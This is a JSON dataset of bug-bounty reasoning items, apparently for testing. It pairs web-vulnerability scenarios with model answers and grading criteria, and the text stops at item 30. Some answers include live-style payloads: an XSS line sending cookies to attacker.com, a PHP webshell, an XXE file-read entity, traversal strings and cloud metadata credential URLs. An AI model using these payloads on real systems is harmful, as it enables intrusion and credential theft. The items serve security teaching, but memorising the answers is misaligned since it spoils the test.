@@ -1,0 +1,902 @@
+[
+  {
+    "id": 1,
+    "scenario": "An API endpoint /api/user/123 returns user data when authenticated as another user.",
+    "prompt": "What vulnerability class should be tested further?",
+    "expected_answer": "This is an Insecure Direct Object Reference (IDOR) vulnerability, a subset of Broken Access Control (OWASP A01). The application fails to verify that the authenticated user has authorization to access the requested resource, allowing horizontal privilege escalation by simply iterating numeric identifiers. An attacker can enumerate user IDs sequentially to exfiltrate sensitive PII, financial data, or account credentials for all users in the system. To build a proof-of-concept, intercept the authenticated request in Burp Suite, send it to Intruder, and iterate the ID parameter while comparing response bodies for data leakage. Remediation requires implementing object-level authorization checks that validate the requesting user owns or has explicit permission to access each resource, using UUIDs instead of sequential IDs, and adding rate limiting on enumeration-prone endpoints.",
+    "reasoning_requirement": "Recognize horizontal privilege escalation via predictable identifiers.",
+    "evaluation_criteria": "Mentions unauthorized data access and object-level access control failure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 2,
+    "scenario": "A password reset token is not invalidated after use.",
+    "prompt": "What security risk does this create?",
+    "expected_answer": "This creates a critical account takeover vulnerability through token replay attacks. Once a legitimate user resets their password, the token remains valid indefinitely, allowing anyone who intercepts or obtains the token (via log files, browser history, email compromise, or referrer leakage) to reset the password again at any future time. The real-world impact is complete account compromise since an attacker can repeatedly reset the victim's password even after the victim has already used the token. A proof-of-concept involves completing a normal password reset flow, then replaying the same reset URL to set a new password again. Remediation requires immediate one-time-use invalidation of tokens after consumption, enforcing short expiration windows (15-30 minutes), and binding tokens to the specific session or IP that initiated the reset.",
+    "reasoning_requirement": "Understand token lifecycle and replay risk.",
+    "evaluation_criteria": "Mentions replay attack and token invalidation requirement.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 3,
+    "scenario": "A GraphQL endpoint exposes introspection in production.",
+    "prompt": "What should a bounty hunter evaluate next?",
+    "expected_answer": "The bounty hunter should immediately enumerate the full schema using introspection queries to discover hidden queries, mutations, and subscriptions that expose sensitive business logic or administrative functionality. GraphQL introspection reveals the entire API surface including undocumented operations, internal types, and relationships between entities that developers may have assumed were hidden. This dramatically expands the attack surface, potentially exposing admin mutations for user management, financial operations, or data export that lack proper authorization checks. A proof-of-concept starts with sending the standard __schema introspection query, then using tools like GraphQL Voyager or InQL to visualize the schema and identify high-value targets like deleteUser, updateRole, or exportData mutations. Remediation requires disabling introspection in production environments, implementing field-level authorization on all resolvers, and applying query depth and complexity limits to prevent abuse.",
+    "reasoning_requirement": "Recognize schema enumeration expands attack surface.",
+    "evaluation_criteria": "Mentions privilege escalation or hidden endpoints discovery.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 4,
+    "scenario": "An upload feature validates file extension but not MIME type.",
+    "prompt": "What attack vector should be tested?",
+    "expected_answer": "This is a file upload bypass vulnerability that can lead to remote code execution (RCE) on the server. When only the file extension is validated, an attacker can craft a polyglot file that has an allowed extension but contains executable server-side code, or use double extensions like shell.php.jpg that may be processed by the web server as PHP. The real-world impact includes complete server compromise, webshell deployment for persistent backdoor access, and lateral movement within the infrastructure. To build a proof-of-concept, upload a file with a .jpg extension but containing PHP code in the body, then access the uploaded file URL to check if the server executes it; alternatively test null byte injection (file.php%00.jpg) or content-type manipulation. Remediation requires server-side validation of both file extension and MIME type using magic bytes, storing uploads outside the webroot, randomizing filenames, and implementing a content delivery proxy that strips executable content.",
+    "reasoning_requirement": "Recognize insufficient server-side validation.",
+    "evaluation_criteria": "Mentions content-type spoofing or polyglot files.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 5,
+    "scenario": "OAuth redirect_uri allows arbitrary domains.",
+    "prompt": "What impact should be evaluated?",
+    "expected_answer": "This is a critical OAuth misconfiguration that enables authorization code or access token interception, leading to full account takeover. When the redirect_uri parameter accepts arbitrary domains, an attacker can craft a malicious authorization URL that redirects the OAuth callback containing the authorization code to an attacker-controlled server. The real-world impact is severe: any user clicking the crafted link will unknowingly send their authorization code to the attacker, who can exchange it for an access token and gain complete access to the victim's account. A proof-of-concept involves modifying the redirect_uri in the authorization request to point to an attacker-controlled domain with a listener capturing the code parameter, then exchanging it at the token endpoint. Remediation requires strict whitelist validation of redirect URIs with exact string matching (no wildcards or partial matches), registering all valid redirect URIs in the OAuth provider configuration, and implementing PKCE for public clients.",
+    "reasoning_requirement": "Understand OAuth token flow abuse.",
+    "evaluation_criteria": "Mentions open redirect + token capture risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 6,
+    "scenario": "Rate limiting exists per IP only.",
+    "prompt": "What bypass technique should be considered?",
+    "expected_answer": "IP-only rate limiting can be bypassed through distributed request patterns using multiple source IPs, rotating proxies, cloud function fan-out, or by spoofing headers like X-Forwarded-For and X-Real-IP that the application may trust for client identification. An attacker can also bypass per-IP limits by leveraging multiple user accounts, IPv6 address rotation, or cloud provider IP pools that provide thousands of unique source addresses cheaply. The real-world impact enables credential stuffing attacks, brute force authentication bypass, and API abuse at scale while evading detection. To demonstrate, configure Burp Suite with a rotating proxy list or use tools like ffuf with multiple threads through different SOCKS proxies, showing successful request completion beyond the rate limit threshold. Remediation should implement multi-dimensional rate limiting combining IP, user account, session token, and device fingerprint, along with exponential backoff, CAPTCHA challenges after threshold violations, and behavioral anomaly detection.",
+    "reasoning_requirement": "Recognize rate-limit enforcement scope weakness.",
+    "evaluation_criteria": "Mentions IP rotation or account-based bypass.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 7,
+    "scenario": "A payment endpoint accepts price from client-side parameter.",
+    "prompt": "What vulnerability type applies?",
+    "expected_answer": "This is a business logic flaw involving parameter tampering where the server trusts client-supplied price values instead of computing them server-side from the product catalog. An attacker can intercept the payment request using a proxy like Burp Suite, modify the price parameter to an arbitrary value (e.g., changing $100.00 to $0.01), and submit the tampered request to complete the purchase at a manipulated price. The real-world impact is direct financial loss for the business, as attackers can purchase goods or services for fractions of their actual cost. A proof-of-concept involves capturing the checkout POST request, modifying the price/amount field in the request body, and forwarding the modified request to observe if the transaction completes at the altered price. Remediation requires all pricing calculations to be performed server-side using authoritative product catalog data, implementing server-side order validation that recalculates totals from item IDs and quantities, and adding integrity checks that compare submitted totals against server-computed values before processing payment.",
+    "reasoning_requirement": "Recognize trust in client-side values.",
+    "evaluation_criteria": "Mentions server-side validation absence.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 8,
+    "scenario": "JWT signature is validated but algorithm is not restricted.",
+    "prompt": "What vulnerability may exist?",
+    "expected_answer": "This is a JWT algorithm confusion attack (CVE-2016-10555) where an attacker can switch the token's algorithm from RS256 (asymmetric) to HS256 (symmetric), then sign the forged token using the server's public RSA key as the HMAC secret. Since the public key is often freely available, the attacker can craft arbitrary claims including admin roles and the server will validate the signature using the public key as the HMAC secret. The real-world impact is complete authentication bypass and privilege escalation, allowing an attacker to impersonate any user or elevate to administrator. To build a proof-of-concept, obtain the server's public RSA key, decode the JWT header and change the alg to HS256, modify the payload claims, then sign the token using the public key with HMAC-SHA256 using tools like jwt_tool or PyJWT. Remediation requires explicitly restricting accepted algorithms in the JWT verification configuration, using separate key stores for different algorithms, and validating the alg header against a strict allowlist before processing the token.",
+    "reasoning_requirement": "Understand HS256 vs RS256 confusion risks.",
+    "evaluation_criteria": "Mentions signature verification misconfiguration.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 9,
+    "scenario": "A website uses CSP but allows 'unsafe-inline'.",
+    "prompt": "What impact should be analyzed?",
+    "expected_answer": "The Content Security Policy with 'unsafe-inline' directive effectively negates the primary XSS protection that CSP provides, as it allows execution of inline scripts, event handlers, and inline styles without restriction. An attacker who finds any injection point can execute arbitrary JavaScript through inline script tags, onclick handlers, or javascript: URIs, completely bypassing the CSP barrier that should have prevented script execution. The real-world impact means that any reflected or stored XSS vulnerability in the application can be fully exploited for session hijacking, credential theft, keylogging, and phishing despite the presence of CSP headers. To demonstrate, inject a simple payload like <img onerror=alert(document.cookie) src=x> and observe that CSP does not block execution due to the unsafe-inline allowance. Remediation requires removing 'unsafe-inline' from the CSP policy, migrating all inline scripts to external files referenced by nonce-based or hash-based CSP directives, and implementing strict-dynamic where appropriate to maintain functionality while enforcing meaningful script execution controls.",
+    "reasoning_requirement": "Understand CSP policy strength factors.",
+    "evaluation_criteria": "Mentions inline script execution risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 10,
+    "scenario": "An internal admin API is accessible without authentication when accessed via internal path.",
+    "prompt": "What class of vulnerability is this?",
+    "expected_answer": "This is an authentication bypass via path-based access control, representing a critical trust boundary failure where the application assumes internal network paths are inherently trusted. The vulnerability occurs when security middleware or reverse proxy rules only enforce authentication for externally-facing routes while leaving internal paths unprotected, allowing attackers who discover the internal path pattern to access admin functionality without credentials. The real-world impact includes complete administrative control over the application, user data manipulation, system configuration changes, and potential infrastructure compromise. A proof-of-concept involves fuzzing for internal path patterns (e.g., /internal/admin, /api/v1/internal/, /_admin) or leveraging SSRF vulnerabilities to access the unprotected internal routes, then demonstrating admin-level operations without authentication. Remediation requires enforcing authentication and authorization at every API endpoint regardless of network path, implementing zero-trust architecture principles where no request is trusted by default, and applying defense-in-depth with multiple authentication checkpoints independent of routing layer.",
+    "reasoning_requirement": "Recognize improper access control enforcement.",
+    "evaluation_criteria": "Mentions trust boundary failure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 11,
+    "scenario": "A password reset link contains predictable numeric IDs.",
+    "prompt": "What attack path should be tested?",
+    "expected_answer": "This vulnerability enables token brute force and enumeration attacks against the password reset mechanism due to low entropy in the token space. Predictable numeric IDs (such as sequential integers or timestamps) can be enumerated by an attacker using automated tools to iterate through possible values and identify valid reset tokens for other users' accounts. The real-world impact is mass account takeover, as an attacker can systematically reset passwords for all users by discovering their active reset tokens through enumeration. To build a proof-of-concept, trigger a reset for a test account, observe the token format and pattern, then use Burp Intruder or a custom script to enumerate nearby values and identify tokens for other accounts by checking for valid HTTP responses. Remediation requires generating reset tokens using cryptographically secure random number generators (CSPRNG) with at least 128 bits of entropy, implementing strict rate limiting on reset token verification endpoints, and setting short expiration windows of 15-30 minutes.",
+    "reasoning_requirement": "Recognize low entropy token risk.",
+    "evaluation_criteria": "Mentions entropy analysis.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 12,
+    "scenario": "The same session cookie works after password change.",
+    "prompt": "What impact does this have?",
+    "expected_answer": "This is a session fixation or persistent session vulnerability where the application fails to invalidate existing sessions after a critical security event like a password change. When old session tokens remain valid after a password change, a compromised session (from XSS, cookie theft, or session hijacking) continues to grant access even after the user has changed their password as a remediation step. The real-world impact is devastating: if an attacker has obtained a user's session cookie, the victim cannot revoke the attacker's access by changing their password, making incident response ineffective. To demonstrate, log in from two different browsers, change the password in one session, then verify the other session still has full access to the application. Remediation requires invalidating all existing sessions upon password change, generating a new session token for the current session only, implementing session rotation on privilege level changes, and providing users with a 'log out all devices' feature for incident response.",
+    "reasoning_requirement": "Understand session invalidation requirements.",
+    "evaluation_criteria": "Mentions failure to rotate sessions.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 13,
+    "scenario": "An API reveals internal error stack traces.",
+    "prompt": "What should be evaluated?",
+    "expected_answer": "This is an information disclosure vulnerability where internal error stack traces leak sensitive technical details that enable targeted exploitation of the application. Stack traces typically reveal framework versions, library dependencies, internal file paths, database query structures, server operating system details, and application architecture that an attacker can use to identify known CVEs and craft precise exploits. The real-world impact includes accelerated reconnaissance enabling attackers to skip enumeration phases, identify exact software versions with known vulnerabilities, understand database schema from ORM error messages, and map internal infrastructure topology. A proof-of-concept involves sending malformed input (invalid JSON, oversized parameters, SQL injection characters) to trigger unhandled exceptions and documenting the leaked information including framework names, version numbers, and file system paths. Remediation requires implementing generic error responses in production that return only a correlation ID, configuring proper error handling middleware that catches all exceptions, logging detailed errors server-side only, and ensuring debug mode is disabled in production configurations.",
+    "reasoning_requirement": "Recognize sensitive debug information exposure.",
+    "evaluation_criteria": "Mentions framework version or file path exposure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 14,
+    "scenario": "Two concurrent withdrawal requests allow overdraft.",
+    "prompt": "What vulnerability type applies?",
+    "expected_answer": "This is a race condition vulnerability (also known as Time-of-Check to Time-of-Use or TOCTOU) caused by the absence of proper transaction locking in the financial operation. The application checks the account balance before processing a withdrawal but does not hold an exclusive lock, allowing a second concurrent request to pass the balance check before the first transaction has been committed. The real-world impact is direct financial loss, as an attacker can drain accounts beyond their balance by sending parallel withdrawal requests timed to exploit the window between balance validation and transaction execution. To build a proof-of-concept, use Burp Suite's Turbo Intruder or a custom multi-threaded script to send 10-20 identical withdrawal requests simultaneously for the full account balance, then verify total withdrawals exceed the original balance. Remediation requires implementing database-level row locking (SELECT FOR UPDATE), using serializable transaction isolation levels for financial operations, adding application-level mutex or distributed locks per account, and implementing idempotency keys to prevent duplicate transaction processing.",
+    "reasoning_requirement": "Recognize lack of transaction locking.",
+    "evaluation_criteria": "Mentions concurrency control absence.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 15,
+    "scenario": "An SSRF vulnerability allows requests to internal IP ranges.",
+    "prompt": "What high-impact target should be tested next?",
+    "expected_answer": "The highest-impact target for SSRF exploitation is the cloud metadata service endpoint, typically accessible at http://169.254.169.254/latest/meta-data/ on AWS, http://metadata.google.internal/ on GCP, or http://169.254.169.254/metadata/instance on Azure. These metadata endpoints expose IAM temporary credentials, instance roles, API tokens, and infrastructure configuration without authentication when accessed from within the cloud network. The real-world impact is catastrophic: stolen cloud credentials can grant access to S3 buckets, databases, Lambda functions, and potentially the entire cloud infrastructure, often leading to complete environment compromise. A proof-of-concept involves directing the SSRF to fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/ to list available roles, then requesting the specific role endpoint to obtain AccessKeyId, SecretAccessKey, and SessionToken for AWS API access. Remediation requires implementing strict URL allowlists, blocking requests to RFC 1918 private ranges and link-local addresses, enforcing IMDSv2 with hop-limited PUT-based token retrieval on cloud instances, and running SSRF-prone services with minimal IAM permissions.",
+    "reasoning_requirement": "Understand SSRF chaining for credential theft.",
+    "evaluation_criteria": "Mentions metadata endpoint risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 16,
+    "scenario": "A search endpoint reflects user input in HTML without encoding.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a Reflected Cross-Site Scripting (XSS) vulnerability where the application echoes user-supplied input directly into the HTML response without proper output encoding or sanitization. An attacker can craft a malicious URL containing JavaScript payloads in the search parameter that will execute in the victim's browser when they click the link, enabling session hijacking, credential theft, keylogging, and phishing. The real-world impact includes account takeover via cookie theft, defacement, redirection to malicious sites, and data exfiltration from the authenticated user's session context. To build a proof-of-concept, inject a payload like <script>fetch('https://attacker.com/steal?c='+document.cookie)</script> into the search parameter and share the crafted URL, or use event handlers like \"><img src=x onerror=alert(document.domain)> if the injection context is within an HTML attribute. Remediation requires implementing context-aware output encoding (HTML entity encoding for HTML context, JavaScript encoding for JS context), using Content Security Policy headers without unsafe-inline, validating and sanitizing all user input, and employing template engines with automatic escaping enabled by default.",
+    "reasoning_requirement": "Recognize lack of output encoding.",
+    "evaluation_criteria": "Mentions script injection risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 17,
+    "scenario": "A file download endpoint allows ../ traversal.",
+    "prompt": "What vulnerability is this?",
+    "expected_answer": "This is a Path Traversal (also known as Directory Traversal) vulnerability that allows an attacker to break out of the intended file directory and access arbitrary files on the server's filesystem. By injecting sequences like ../../etc/passwd or ..\\..\\windows\\system32\\config\\sam, an attacker can read sensitive system files, application configuration files containing database credentials, source code, and private keys. The real-world impact includes exposure of credentials and secrets from configuration files, access to application source code revealing additional vulnerabilities, reading SSH private keys for lateral movement, and extracting database connection strings for direct database access. A proof-of-concept involves modifying the file download parameter to include traversal sequences such as ../../../../etc/passwd or URL-encoded variants like %2e%2e%2f, testing multiple encoding layers to bypass basic filters. Remediation requires validating that the resolved file path stays within the intended directory using canonical path comparison, implementing a whitelist of allowed files, stripping or rejecting path traversal characters, and using a chroot or containerized environment to limit filesystem access.",
+    "reasoning_requirement": "Recognize directory traversal pattern.",
+    "evaluation_criteria": "Mentions unauthorized file access.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 18,
+    "scenario": "Account lockout triggers after 5 failed attempts per username.",
+    "prompt": "What denial-of-service vector may exist?",
+    "expected_answer": "This creates an account lockout abuse vulnerability where an attacker can intentionally lock out legitimate users by submitting five incorrect password attempts against targeted usernames, effectively denying service to those accounts. The attack is trivially automatable: an attacker with a list of valid usernames (obtained through user enumeration) can systematically lock out every account on the platform with a simple script. The real-world impact includes targeted denial of service against specific high-value accounts (executives, administrators), large-scale disruption by locking all user accounts, and potential extortion scenarios where attackers threaten mass lockouts. A proof-of-concept involves scripting five rapid login attempts with invalid passwords for each target username and verifying the account becomes inaccessible to the legitimate owner. Remediation should implement progressive delays instead of hard lockouts, use CAPTCHA challenges after failed attempts, lock based on IP rather than username, implement temporary lockouts with short durations (5-15 minutes) that auto-reset, and send notification alerts to users about failed login attempts.",
+    "reasoning_requirement": "Understand abuse of lockout protection.",
+    "evaluation_criteria": "Mentions targeted user disruption.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 19,
+    "scenario": "An API key is embedded in mobile app source.",
+    "prompt": "What should be tested?",
+    "expected_answer": "This is a client-side secret exposure vulnerability where API keys embedded in mobile application code can be extracted through reverse engineering and abused to access backend services with the application's full privileges. An attacker can decompile the APK using jadx or apktool, or inspect the IPA using class-dump, to extract hardcoded API keys, secrets, and endpoint URLs directly from the application binary or its resources. The real-world impact includes unauthorized API access consuming the company's quota and billing, data exfiltration if the key grants read access to sensitive resources, and lateral movement if the key provides access to cloud services like AWS, Firebase, or third-party integrations. A proof-of-concept involves decompiling the application, searching for strings matching API key patterns (base64, hex, or prefixed keys), then using the extracted key to make direct API calls via curl or Postman to demonstrate unauthorized access. Remediation requires implementing a backend proxy that holds the actual API keys and authenticates mobile clients via short-lived tokens, using certificate pinning, implementing key scoping with minimal permissions, rotating keys regularly, and using platform-specific secure storage like Android Keystore or iOS Keychain for any client-side secrets.",
+    "reasoning_requirement": "Recognize client-side secret exposure.",
+    "evaluation_criteria": "Mentions reverse engineering risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 20,
+    "scenario": "A user can change their role field via profile update request.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a privilege escalation vulnerability via mass assignment (also known as auto-binding or object injection) where the API binds all client-submitted fields directly to the user model without filtering sensitive attributes. An attacker can add unexpected fields like 'role': 'admin' or 'isAdmin': true to a legitimate profile update request, and the server will blindly apply these changes to the database, granting unauthorized elevated privileges. The real-world impact is complete vertical privilege escalation, allowing a regular user to gain administrative access with full control over the application, other users' data, and system configuration. To build a proof-of-concept, intercept a normal profile update request in Burp Suite, add fields like role, permissions, isAdmin, or accountType with elevated values, submit the request, and verify the user's privileges have been escalated by attempting to access admin-only endpoints. Remediation requires implementing strict allowlists of modifiable fields on every API endpoint, using DTOs (Data Transfer Objects) that explicitly define which fields can be updated by users, separating the profile update schema from the internal user model, and applying role-based field access controls.",
+    "reasoning_requirement": "Recognize improper field binding.",
+    "evaluation_criteria": "Mentions server-side role enforcement failure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 21,
+    "scenario": "A web application accepts JSON input and binds all fields directly to database model.",
+    "prompt": "What vulnerability class should be tested?",
+    "expected_answer": "This is a Mass Assignment vulnerability where the application's automatic data binding maps all client-submitted JSON fields directly to the database model without filtering, allowing attackers to modify restricted attributes they should not have access to. An attacker can inject additional fields like balance, credit, role, verified, or isAdmin into any JSON request body, and the ORM will persist these values to the database alongside the legitimate fields. The real-world impact includes unauthorized privilege escalation, financial manipulation by modifying account balances, bypassing verification workflows, and corrupting data integrity across the application. A proof-of-concept involves examining the API's data model through documentation or response inspection, then adding fields like {\"username\": \"test\", \"role\": \"admin\", \"balance\": 999999} to a registration or update request and verifying the injected values are reflected in the database. Remediation requires implementing explicit allowlists of bindable fields per endpoint, using separate input DTOs that only include permitted attributes, configuring the ORM to reject unknown fields, and applying field-level authorization checks that validate which attributes each role can modify.",
+    "reasoning_requirement": "Recognize automatic binding of sensitive fields.",
+    "evaluation_criteria": "Mentions ability to modify restricted attributes like role or balance.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 22,
+    "scenario": "An image processing endpoint fetches remote URLs for resizing.",
+    "prompt": "What vulnerability chain should be evaluated?",
+    "expected_answer": "This is a Server-Side Request Forgery (SSRF) vulnerability where the image processing service can be abused to make arbitrary HTTP requests from the server, potentially accessing internal services, cloud metadata endpoints, and private network resources. By supplying a URL pointing to internal IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x) or cloud metadata services (169.254.169.254), an attacker can probe internal infrastructure, steal cloud credentials, and access services that are not exposed to the public internet. The real-world impact includes exfiltration of AWS/GCP/Azure IAM credentials from metadata services, port scanning of internal networks, accessing internal databases and admin panels, and potentially achieving remote code execution through internal service exploitation. A proof-of-concept involves submitting a URL like http://169.254.169.254/latest/meta-data/iam/security-credentials/ as the image source and examining the response for cloud credential data, or using DNS rebinding to bypass IP-based filters. Remediation requires implementing strict URL validation with allowlists of permitted domains, blocking private IP ranges and link-local addresses at the network level, using a sandboxed network environment for URL fetching with no access to internal services, and disabling HTTP redirects that could bypass URL validation.",
+    "reasoning_requirement": "Recognize server-side URL fetching risks.",
+    "evaluation_criteria": "Mentions internal IP and metadata endpoint testing.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 23,
+    "scenario": "An admin panel is hidden but accessible via direct URL.",
+    "prompt": "What security issue applies?",
+    "expected_answer": "This is a Missing Access Control vulnerability that relies on security by obscurity, where the admin panel lacks proper authentication and authorization enforcement and is only 'protected' by not being linked in the visible navigation. An attacker can discover the admin URL through directory brute-forcing with tools like dirsearch or gobuster, examining JavaScript source files for route definitions, checking robots.txt, or analyzing sitemap.xml files. The real-world impact is complete administrative compromise, as once the URL is discovered, any unauthenticated user gains full admin access to manage users, modify configurations, access sensitive data, and potentially execute system commands. A proof-of-concept involves running gobuster or ffuf with a common admin path wordlist (/admin, /administrator, /manage, /dashboard, /cp) against the target, or inspecting the frontend JavaScript bundle for route definitions that reveal admin paths. Remediation requires implementing proper authentication on all admin endpoints, enforcing role-based authorization checks at every request, adding multi-factor authentication for administrative access, implementing IP allowlisting for admin interfaces, and ensuring admin routes are served from a separate domain or network segment.",
+    "reasoning_requirement": "Recognize security by obscurity failure.",
+    "evaluation_criteria": "Mentions need for authentication and authorization enforcement.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 24,
+    "scenario": "A password reset token is 6-digit numeric.",
+    "prompt": "What should be evaluated?",
+    "expected_answer": "This presents a brute force feasibility concern due to the extremely low entropy of a 6-digit numeric token, which has only 1,000,000 possible combinations (10^6). At typical API response times of 50-100ms per request, the entire keyspace can be exhausted in under 28 hours with a single thread, or minutes with distributed requests if rate limiting is absent. The real-world impact is mass account takeover, as an attacker can systematically brute-force active reset tokens to compromise any account that has recently requested a password reset. A proof-of-concept involves triggering a password reset for a target account, then using Burp Intruder or a custom script to iterate through all 000000-999999 combinations against the reset verification endpoint, monitoring for a successful response code. Remediation requires increasing token entropy to at least 128 bits using cryptographically secure random generation, implementing strict rate limiting (3-5 attempts before lockout), adding exponential backoff delays, binding tokens to the requesting session, setting short expiration windows, and implementing account-level throttling on verification attempts.",
+    "reasoning_requirement": "Analyze token strength and attempt rate limits.",
+    "evaluation_criteria": "Mentions entropy calculation and rate limiting importance.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 25,
+    "scenario": "An endpoint accepts XML input without disabling external entities.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an XML External Entity (XXE) Injection vulnerability where the XML parser processes external entity declarations, allowing an attacker to include references to local files, internal URLs, or remote resources within the XML payload. By crafting a malicious XML document with entity definitions like <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>, an attacker can read arbitrary files from the server filesystem, perform SSRF to access internal services, or cause denial of service via recursive entity expansion (billion laughs attack). The real-world impact includes reading sensitive configuration files containing database credentials and API keys, scanning internal network ports, exfiltrating data through out-of-band channels, and potentially achieving remote code execution in certain configurations. A proof-of-concept involves sending XML input with an external entity referencing /etc/passwd or a Burp Collaborator URL and observing the file contents or DNS callback in the response. Remediation requires disabling DTD processing and external entity resolution in the XML parser configuration, using less complex data formats like JSON where possible, implementing input validation that rejects DOCTYPE declarations, and applying the principle of least privilege to the parser's filesystem and network access.",
+    "reasoning_requirement": "Recognize XML parser misconfiguration risk.",
+    "evaluation_criteria": "Mentions file disclosure or SSRF via XXE.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 26,
+    "scenario": "The application reflects user input inside a JavaScript variable.",
+    "prompt": "What type of XSS should be tested?",
+    "expected_answer": "This is a DOM-based or reflected XSS vulnerability in a JavaScript execution context, which requires different exploitation techniques than standard HTML context injection. When user input is reflected inside a JavaScript variable (e.g., var search = 'USER_INPUT';), an attacker can break out of the string context using payloads like ';alert(document.cookie)// or use template literal injection if backticks are used. The real-world impact includes session hijacking, credential theft, keylogging, and full account compromise through arbitrary JavaScript execution in the victim's authenticated browser context. A proof-of-concept involves identifying the exact injection context (single quotes, double quotes, template literals, or script blocks), crafting a context-appropriate breakout payload, and demonstrating code execution with a callback to an attacker-controlled server to exfiltrate session tokens. Remediation requires applying JavaScript-specific output encoding (escaping quotes, backslashes, and special characters), using Content Security Policy with nonce-based script allowlisting, avoiding dynamic construction of JavaScript code from user input entirely, and implementing input validation with strict character whitelists.",
+    "reasoning_requirement": "Distinguish client-side execution context.",
+    "evaluation_criteria": "Mentions JS context injection.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 27,
+    "scenario": "A referral bonus can be claimed multiple times by changing email casing.",
+    "prompt": "What vulnerability type applies?",
+    "expected_answer": "This is a business logic flaw exploiting case-sensitivity inconsistency in the application's duplicate detection mechanism. The application treats user@example.com and User@Example.com as different entities for referral validation but as the same account for email delivery, allowing an attacker to claim referral bonuses multiple times by registering with case variations of the same email address. The real-world impact is direct financial loss through fraudulent bonus accumulation, as an attacker can programmatically generate thousands of case permutations (2^n combinations where n is the number of alphabetic characters) to repeatedly claim referral rewards. A proof-of-concept involves registering multiple accounts with case variations of the same email (test@email.com, Test@email.com, TEST@email.com), claiming the referral bonus on each, and documenting the total fraudulent payout. Remediation requires normalizing all email addresses to lowercase before comparison and storage, implementing unique constraint checks on normalized email values, adding velocity checks on referral claims from similar IPs or device fingerprints, and conducting server-side deduplication using canonicalized identifiers for all bonus eligibility logic.",
+    "reasoning_requirement": "Recognize case-sensitivity inconsistency exploitation.",
+    "evaluation_criteria": "Mentions logic bypass due to normalization failure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 28,
+    "scenario": "A file upload endpoint blocks .php extension but allows .php.jpg.",
+    "prompt": "What should be evaluated?",
+    "expected_answer": "This is a file extension filter bypass vulnerability where the blacklist-based validation only checks the final extension, allowing double extension attacks that may result in server-side code execution. Web servers like Apache with misconfigured handlers may process .php.jpg files as PHP when the AddHandler directive matches the .php extension anywhere in the filename, or the file may be renamed during processing. The real-world impact is remote code execution through webshell deployment, allowing an attacker to execute arbitrary system commands, establish a persistent backdoor, exfiltrate data, and pivot to other internal systems. A proof-of-concept involves uploading a file named shell.php.jpg containing PHP webshell code (<?php system($_GET['cmd']); ?>), accessing the uploaded file URL, and testing for code execution by appending ?cmd=id to the request. Remediation requires implementing a whitelist-based extension validation approach that only allows specific known-safe extensions, validating file content using magic bytes rather than extension, storing uploaded files outside the webroot, serving uploads through a proxy that strips execution capabilities, and randomizing filenames upon storage.",
+    "reasoning_requirement": "Recognize double extension handling weakness.",
+    "evaluation_criteria": "Mentions server-side execution context testing.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 29,
+    "scenario": "A mobile API does not verify JWT audience claim.",
+    "prompt": "What risk does this introduce?",
+    "expected_answer": "This vulnerability enables cross-service token reuse where a JWT issued for one application or API can be used to authenticate against a different service within the same organization's ecosystem that shares the same signing key. Without audience (aud) claim validation, an attacker who obtains a token from a low-security service (such as a marketing API or public mobile app) can replay that token against high-security services (such as admin APIs or payment systems) that trust the same JWT issuer. The real-world impact includes unauthorized access escalation across microservices, where a token intended for read-only mobile access could grant write privileges on internal administrative endpoints. A proof-of-concept involves capturing a JWT from the mobile application, then submitting it as the Authorization header to other API endpoints within the organization's domain (discovered through reconnaissance), observing which services accept the token without audience validation. Remediation requires enforcing strict audience claim validation on every service, issuing tokens with specific audience values matching each service's identifier, implementing token binding to specific clients or devices, and using separate signing keys for services with different trust levels.",
+    "reasoning_requirement": "Understand importance of JWT claim validation.",
+    "evaluation_criteria": "Mentions cross-service authentication abuse.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 30,
+    "scenario": "An endpoint returns 403 for unauthorized access but allows HEAD requests.",
+    "prompt": "What should be tested?",
